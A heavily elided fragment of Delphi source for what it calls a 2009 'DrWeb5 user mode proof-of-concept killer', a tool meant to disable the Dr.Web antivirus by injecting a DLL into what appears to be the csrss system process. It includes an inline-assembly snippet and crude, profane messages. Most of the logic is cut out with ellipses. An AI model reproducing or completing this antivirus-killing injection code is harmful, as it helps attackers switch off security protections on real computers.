...
begin
  MessageBoxW(GetDesktopWindow(), PStr, SpiDiE14, Buttons);
end;
...
begin
  ...
  begin
    ...
    begin
      ...
      ShowMessage('DrWeb5 user mode proof-of-concept killer'#13#10 +
        'DKOH, fucking SSDT / Shadow SSDT will not help DrWeb!'#13#13#10 +
        '(c) 2009 by EP_X0FF', MB_OK);

      asm
        mov eax, large fs:18h //set last error 0
        xor ecx, ecx
        mov [eax + $34], ecx
      end;
      ...
      begin
        ...
        if (EventHandle <> 0) then
        begin
          if not InjectDll(hCsrss, tmp1) then OutputDebugStringW('Failed at injection stage') else
          begin
  ...
  OutputDebugStringW('И хватит срать сюда своими быдлокодерскими меcсаджами, господа, e.g. bool b = false; if (b == true) { } else { }');
